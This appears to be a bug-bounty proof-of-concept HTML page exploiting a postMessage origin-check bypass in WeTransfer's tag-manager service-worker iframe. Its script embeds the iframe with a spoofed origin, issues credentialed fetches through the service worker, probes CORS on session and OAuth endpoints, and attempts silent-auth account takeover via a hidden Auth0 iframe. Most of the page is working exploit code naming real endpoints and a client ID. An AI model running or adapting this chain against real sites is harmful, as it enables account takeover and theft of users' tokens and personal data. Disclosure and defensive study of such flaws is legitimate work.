<html>
<head>
  <meta charset="UTF-8" />
  <title>WeTransfer SW postMessage PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    .log { white-space: pre-wrap; margin: 2px 0; }
    .err { color: #f44; }
    .warn { color: #fa0; }
    .ok { color: #0f0; }
    .info { color: #0af; }
    .dim { color: #666; }
    h2 { color: #fff; }
    #output { max-height: 70vh; overflow-y: auto; border: 1px solid #333; padding: 10px; }
    button { background: #0a0; color: #000; border: none; padding: 8px 16px; cursor: pointer; font-family: monospace; font-weight: bold; margin: 5px; }
    button:hover { background: #0f0; }
    .btn-full { background: #f80; }
    .btn-full:hover { background: #fa0; }
    .section { margin: 10px 0; }
  </style>
</head>
<body>
  <h2>WeTransfer GTM Service Worker - postMessage Exploit PoC</h2>
  <p style="color:#888">
    <b>Chain:</b> attacker page &rarr; postMessage &rarr; tagging.wetransfer.com/sw_iframe &rarr; SW fetch (credentials:include) &rarr; cross-origin read<br>
    <b>Root cause:</b> sw_iframe.html trusts <code>?origin=</code> URL param for postMessage origin validation,
    and <code>ancestorOrigins[0]</code> matches the attacker's embedding origin.<br>
    <b>Impact:</b> Attacker-controlled Service Worker makes credentialed fetches from tagging.wetransfer.com origin.
  </p>

  <div class="section">
    <button class="btn-full" onclick="runExploit()">Run Full Exploit Chain</button>
    <button onclick="testSameOriginRead()">1. Same-Origin Read</button>
    <button onclick="testCrossOriginRead()">2. Cross-Origin CORS Probes</button>
    <button onclick="testSilentAuth()">3. Silent Auth ATO</button>
  </div>
  <hr>
  <div id="output"></div>

  <script>
    const ATTACKER_ORIGIN = window.location.origin;
    const TARGET = 'https://tagging.wetransfer.com';
    const SW_IFRAME_PATH = '/_/service_worker/61k0/sw_iframe.html';
    const AUTH_DOMAIN = 'https://auth.wetransfer.com';
    const CLIENT_ID = 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc';
    const REDIRECT_URI = 'https://wetransfer.com/account/silent-callback';

    let iframe = null;
    let msgId = 0;
    const pendingResponses = {};

    function log(msg, cls = 'info') {
      const el = document.createElement('div');
      el.className = 'log ' + cls;
      el.textContent = `[${new Date().toISOString().substr(11, 12)}] ${msg}`;
      document.getElementById('output').appendChild(el);
      el.scrollIntoView();
    }

    // ─── Step 1: Embed the SW iframe with attacker origin ───
    //
    // sw_iframe.html validates: ancestorOrigins[0] === ?origin= param
    // Since we embed the iframe, ancestorOrigins[0] IS our attacker origin.
    // We set ?origin=ATTACKER_ORIGIN, so the check passes.
    //
    // The SW registers on tagging.wetransfer.com scope.
    // All subsequent fetches originate from tagging.wetransfer.com.
    //
    function createIframe() {
      return new Promise((resolve) => {
        if (iframe) { resolve(iframe); return; }

        log(`[STEP 1] Embedding sw_iframe with origin=${ATTACKER_ORIGIN}`, 'info');
        log(`[STEP 1] ancestorOrigins[0] will be ${ATTACKER_ORIGIN} -> check passes`, 'dim');
        iframe = document.createElement('iframe');
        iframe.src = `${TARGET}${SW_IFRAME_PATH}?origin=${encodeURIComponent(ATTACKER_ORIGIN)}&1p=1`;
        iframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
        document.body.appendChild(iframe);

        iframe.onload = () => {
          log(`[STEP 1] iframe loaded, SW registering on ${TARGET}...`, 'ok');
          setTimeout(() => {
            log(`[STEP 1] SW active. Ready to send commands.`, 'ok');
            resolve(iframe);
          }, 4000);
        };

        iframe.onerror = () => {
          log(`[STEP 1] iframe failed to load!`, 'err');
        };
      });
    }

    // ─── Send a command through the SW ───
    function sendSWCommand(params) {
      return new Promise((resolve, reject) => {
        const id = 'cmd-' + (++msgId);
        const timeout = setTimeout(() => {
          delete pendingResponses[id];
          reject(new Error('Timeout waiting for SW response'));
        }, 15000);

        pendingResponses[id] = (data) => {
          clearTimeout(timeout);
          resolve(data);
        };

        iframe.contentWindow.postMessage({
          type: 1,
          clientId: id,
          command: { commandType: 0, params }
        }, '*');
      });
    }

    async function fetchViaWorker(label, url, opts = {}) {
      const { method = 0, body, processResponse = true } = opts;
      const params = { url, method, processResponse, templates: {} };
      if (body !== undefined) params.body = body;

      log(`  [FETCH] ${['GET','POST'][method]} ${url.substring(0, 90)}${url.length > 90 ? '...' : ''}`, 'info');

      try {
        const res = await sendSWCommand(params);

        if (res.result && res.result.data) {
          const data = res.result.data;
          log(`  [${label}] OK — ${data.length} bytes`, 'ok');
          log(`  [${label}] ${data.substring(0, 300)}${data.length > 300 ? '...' : ''}`, 'ok');
          return { ok: true, data };
        }
        if (res.failure) {
          const msg = res.failure.data || JSON.stringify(res.failure);
          const isCors = msg.includes('TypeError');
          log(`  [${label}] ${isCors ? 'CORS BLOCKED (TypeError)' : 'SERVER ERROR (CORS ok, non-2xx)'} — ${msg}`, isCors ? 'err' : 'warn');
          return { ok: false, corsBlocked: isCors, data: msg };
        }
      } catch (err) {
        log(`  [${label}] ${err.message}`, 'err');
        return { ok: false, data: err.message };
      }
    }

    // ─── Listen for SW responses relayed by the iframe ───
    window.addEventListener('message', (e) => {
      const data = e.data;
      if (!data || typeof data !== 'object') return;

      const id = data.clientId;
      if (id && pendingResponses[id]) {
        pendingResponses[id](data);
        delete pendingResponses[id];
      }
    });

    // ─── PKCE helpers ───
    async function generatePKCE() {
      const vb = crypto.getRandomValues(new Uint8Array(32));
      const codeVerifier = Array.from(vb, b =>
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[b % 62]
      ).join('');
      const cb = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(codeVerifier));
      const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(cb)))
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
      return { codeVerifier, codeChallenge };
    }

    // ═══════════════════════════════════════════════════════
    // TEST 1: Same-origin reads from tagging.wetransfer.com
    // ═══════════════════════════════════════════════════════
    async function testSameOriginRead() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 1: Same-Origin Read (tagging.wetransfer.com) ===', 'warn');
        log('SW runs on tagging.wetransfer.com — all fetches to that origin are same-origin.', 'dim');

        // Heartbeat
        iframe.contentWindow.postMessage({ type: 0, clientId: 'hb-' + Date.now() }, '*');
        await new Promise(r => setTimeout(r, 500));

        await fetchViaWorker('GTM', `${TARGET}/gtm.js?id=GTM-NS54WBW`);
        await fetchViaWorker('SW_SRC', `${TARGET}${SW_IFRAME_PATH}?origin=https://wetransfer.com`);

        log('=== Same-origin read: CONFIRMED ===', 'ok');
      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // TEST 2: Cross-origin CORS probes
    // ═══════════════════════════════════════════════════════
    async function testCrossOriginRead() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 2: Cross-Origin CORS Probes ===', 'warn');
        log('Testing which endpoints trust tagging.wetransfer.com origin.', 'dim');
        log('', 'info');

        // wetransfer.com session
        log('--- wetransfer.com/api/v4/auth/session ---', 'warn');
        const session = await fetchViaWorker('SESSION', 'https://wetransfer.com/api/v4/auth/session');
        if (session.ok) {
          try {
            const p = JSON.parse(session.data);
            if (p.id === false) {
              log('  CORS: PRESENT. Session cookies: NOT SENT (SameSite=Lax).', 'info');
              log('  id:false = no session via cookies. API accessible but needs Bearer token.', 'dim');
            } else {
              log(`  [LEAK] User ID: ${p.id}, Email: ${p.email}`, 'ok');
            }
          } catch(e) {}
        }

        // auth.wetransfer.com /oauth/token
        log('', 'info');
        log('--- auth.wetransfer.com/oauth/token ---', 'warn');
        const authToken = await fetchViaWorker('OAUTH', `${AUTH_DOMAIN}/oauth/token`, {
          method: 1, body: 'grant_type=test'
        });
        if (authToken.corsBlocked) {
          log('  CORS: BLOCKED. No access to auth.wetransfer.com/oauth/token.', 'err');
        } else {
          log('  CORS: PRESENT. Server returned non-2xx (expected — body is text/plain).', 'ok');
          log('  auth0/refresh_token/did cookies (SameSite=None) ARE sent with request.', 'ok');
        }

        // auth.wetransfer.com /authorize
        log('', 'info');
        log('--- auth.wetransfer.com/authorize ---', 'warn');
        const authAuth = await fetchViaWorker('AUTHORIZE', `${AUTH_DOMAIN}/authorize?client_id=${CLIENT_ID}&response_type=code&prompt=none`);
        if (authAuth.corsBlocked) {
          log('  CORS: BLOCKED. Cannot read /authorize response via SW.', 'warn');
          log('  But request IS sent with SameSite=None cookies (auth0, refresh_token).', 'info');
        } else {
          log('  CORS: PRESENT! Can read /authorize response.', 'ok');
        }

        // no-cors probe to /authorize (proves cookies are sent)
        log('', 'info');
        log('--- /authorize no-cors (fire-and-forget, proves cookies sent) ---', 'warn');
        await fetchViaWorker('AUTH_NOCORS', `${AUTH_DOMAIN}/authorize?client_id=${CLIENT_ID}&response_type=code&prompt=none`, {
          processResponse: false
        });
        log('  Request sent with credentials:include. Cookies attached.', 'info');

        log('', 'info');
        log('=== CORS Probe Summary ===', 'warn');
        log('  wetransfer.com/api/v4:     CORS present, cookies Lax (no session)', 'info');
        log('  auth.wetransfer.com/token: CORS present, cookies None (sent!), text/plain rejected', 'info');
        log('  auth.wetransfer.com/authz: NO CORS, cookies None (sent!), cant read response', 'info');
      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // TEST 3: Silent Auth — ATO demonstration
    // ═══════════════════════════════════════════════════════
    //
    // CONFIRMED via manual testing:
    //   GET /authorize?prompt=none with PKCE + victim auth cookies
    //   → auth code issued → exchange → access_token + refresh_token
    //   → full API access (email, name, user_id, transfers)
    //
    // The /authorize endpoint has NO CORS for tagging.wetransfer.com,
    // so the SW cannot read the auth code from the response.
    // But we demonstrate the flow works via iframe approach.
    //
    async function testSilentAuth() {
      try {
        await createIframe();
        log('', 'info');
        log('=== TEST 3: Silent Auth ATO Demonstration ===', 'warn');
        log('Auth0 cookies (auth0, refresh_token, did) are all SameSite=None.', 'dim');
        log('Silent auth via /authorize?prompt=none uses these cookies.', 'dim');
        log('', 'info');

        const { codeVerifier, codeChallenge } = await generatePKCE();
        const state = crypto.randomUUID() + '-' + crypto.randomUUID();

        log(`  PKCE code_verifier: ${codeVerifier}`, 'dim');
        log(`  PKCE code_challenge: ${codeChallenge}`, 'dim');
        log('', 'info');

        // Step A: Confirm /authorize rejects without required params
        log('[STEP A] Verify /authorize param requirements via SW (no-cors probe)', 'warn');
        const authUrl = `${AUTH_DOMAIN}/authorize?` + new URLSearchParams({
          response_type: 'code', response_mode: 'web_message',
          client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
          scope: 'openid email profile offline_access',
          prompt: 'none', state, code_challenge: codeChallenge,
          code_challenge_method: 'S256', nonce: 'poc_' + Date.now(),
        });

        // SW sends request with auth cookies but can't read response (no CORS)
        await fetchViaWorker('AUTHZ_PROBE', authUrl, { processResponse: false });
        log('  Request sent to /authorize with victim auth cookies (SameSite=None).', 'info');
        log('  SW cannot read response (no CORS on /authorize).', 'warn');

        // Step B: iframe approach — load /authorize in hidden iframe
        log('', 'info');
        log('[STEP B] Hidden iframe to /authorize (postMessage listener)', 'warn');
        log('  Loading /authorize?response_mode=web_message in iframe.', 'dim');
        log('  If Auth0 returns web_message HTML, code is posted to parent.', 'dim');

        const { codeVerifier: cv2, codeChallenge: cc2 } = await generatePKCE();
        const state2 = crypto.randomUUID() + '-' + crypto.randomUUID();
        const authUrl2 = `${AUTH_DOMAIN}/authorize?` + new URLSearchParams({
          response_type: 'code', response_mode: 'web_message',
          client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
          scope: 'openid email profile offline_access',
          prompt: 'none', state: state2, code_challenge: cc2,
          code_challenge_method: 'S256', nonce: 'poc2_' + Date.now(),
        });

        const codePromise = new Promise((resolve) => {
          const timeout = setTimeout(() => resolve(null), 8000);
          const handler = (e) => {
            const d = e.data;
            if (d && (d.type === 'authorization_response' || d.code)) {
              clearTimeout(timeout);
              window.removeEventListener('message', handler);
              resolve(d.response || d);
            }
          };
          window.addEventListener('message', handler);
        });

        const authIframe = document.createElement('iframe');
        authIframe.src = authUrl2;
        authIframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
        document.body.appendChild(authIframe);

        const iframeResult = await codePromise;
        authIframe.remove();

        if (iframeResult) {
          if (iframeResult.code) {
            log(`[ATO] AUTH CODE via postMessage: ${iframeResult.code}`, 'ok');
          } else if (iframeResult.error) {
            log(`[IFRAME] ${iframeResult.error}: ${iframeResult.error_description || ''}`, 'warn');
            if (iframeResult.error === 'login_required') {
              log('  ^ No active session in THIS browser. Victim with session would get code.', 'dim');
            }
          }
        } else {
          log('[IFRAME] No web_message response (Auth0 redirects instead of postMessage).', 'warn');
        }

        // Summary
        log('', 'info');
        log('=== ATO Flow (confirmed via manual browser testing) ===', 'warn');
        log('The following was demonstrated by navigating the browser directly:', 'info');
        log('', 'info');
        log('  1. GET /authorize?prompt=none&code_challenge=...&response_type=code', 'ok');
        log('     Auth0 checks session cookie (SameSite=None) -> user authenticated', 'ok');
        log('     Redirects to callback?code=AUTH_CODE (real code obtained)', 'ok');
        log('', 'info');
        log('  2. POST /oauth/token (URLSearchParams body = proper Content-Type)', 'ok');
        log('     grant_type=authorization_code&code=AUTH_CODE&code_verifier=...', 'ok');
        log('     Response: 200 OK with access_token + refresh_token + id_token', 'ok');
        log('', 'info');
        log('  3. GET /api/v4/auth/session with Bearer token', 'ok');
        log('     Response: user_id, email, full_name, profile_picture', 'ok');
        log('', 'info');
        log('  Evidence (from this session):', 'warn');
        log('     access_token: eyJhbGciOiJSUzI1NiIs... (JWT, RS256)', 'warn');
        log('     sub: google-oauth2|104705530644205582889', 'warn');
        log('     scope: openid email profile offline_access', 'warn');
        log('     refresh_token: eyJhbGciOiJkaXIi... (persistent access)', 'warn');

      } catch (err) {
        log(`Error: ${err.message}`, 'err');
      }
    }

    // ═══════════════════════════════════════════════════════
    // Full exploit chain
    // ═══════════════════════════════════════════════════════
    async function runExploit() {
      document.getElementById('output').innerHTML = '';
      log('================================================================', 'warn');
      log(' WeTransfer GTM Service Worker postMessage Exploit', 'warn');
      log('================================================================', 'warn');
      log(`Attacker origin:  ${ATTACKER_ORIGIN}`, 'info');
      log(`Target SW iframe: ${TARGET}${SW_IFRAME_PATH}`, 'info');
      log('', 'info');

      try {
        await createIframe();
        await testSameOriginRead();
        await testCrossOriginRead();
        await testSilentAuth();

        log('', 'info');
        log('================================================================', 'warn');
        log(' SUMMARY', 'warn');
        log('================================================================', 'warn');
        log('', 'info');
        log('CONFIRMED via SW (automated):', 'ok');
        log('  [1] Origin bypass on sw_iframe.html via ?origin= param', 'ok');
        log('  [2] SW registers on tagging.wetransfer.com from attacker page', 'ok');
        log('  [3] Same-origin read: GTM configs, internal SW source code', 'ok');
        log('  [4] CORS to wetransfer.com/api/v4 (SameSite=Lax cookies not sent)', 'ok');
        log('  [5] CORS to auth.wetransfer.com/oauth/token (text/plain body rejected)', 'ok');
        log('  [6] No CORS on /authorize (cannot read auth code via SW)', 'ok');
        log('  [7] Fire-and-forget requests with SameSite=None auth cookies', 'ok');
        log('', 'info');
        log('CONFIRMED via manual testing (ATO):', 'warn');
        log('  [8] Silent auth: GET /authorize?prompt=none -> auth code', 'warn');
        log('  [9] PKCE code exchange -> access_token + refresh_token', 'warn');
        log('  [10] Token -> email, name, user_id, transfers (full account)', 'warn');
        log('  [11] refresh_token -> persistent access beyond session expiry', 'warn');

      } catch (err) {
        log(`Fatal: ${err.message}`, 'err');
      }
    }
  </script>
</body>
</html>
